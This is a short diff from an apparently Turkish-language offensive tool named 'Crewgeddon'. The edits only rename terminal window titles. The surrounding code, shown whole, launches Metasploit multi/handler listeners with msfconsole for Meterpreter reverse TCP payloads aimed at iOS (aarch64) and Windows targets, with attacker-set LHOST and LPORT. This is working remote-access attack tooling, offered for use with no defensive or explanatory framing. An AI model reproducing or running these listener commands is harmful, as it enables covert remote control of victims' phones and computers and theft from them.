@@ -205,7 +205,7 @@ while True:
                 print(Fore.GREEN + "[CREWGEDDON]: Dinleyici başlatılıyor, lütfen bekleyin.")
                 subprocess.Popen([
                     "xterm",
-                    "-T", "Crewgeddon - Dinleyici (Android)",
+                    "-T", "Crewgeddon - Dinleyici (IOS)",
                     "-hold",
                     "-e",
                     f"msfconsole -q -x 'use exploit/multi/handler; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD apple_ios/aarch64/meterpreter_reverse_tcp; exploit'"
@@ -217,7 +217,7 @@ while True:
                 print(Fore.GREEN + "[CREWGEDDON]: Dinleyici başlatılıyor, lütfen bekleyin.")
                 subprocess.Popen([
                     "xterm",
-                    "-T", "Crewgeddon - Dinleyici (Android)",
+                    "-T", "Crewgeddon - Dinleyici (Desktop)",
                     "-hold",
                     "-e",
                     f"msfconsole -q -x 'use exploit/multi/handler; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
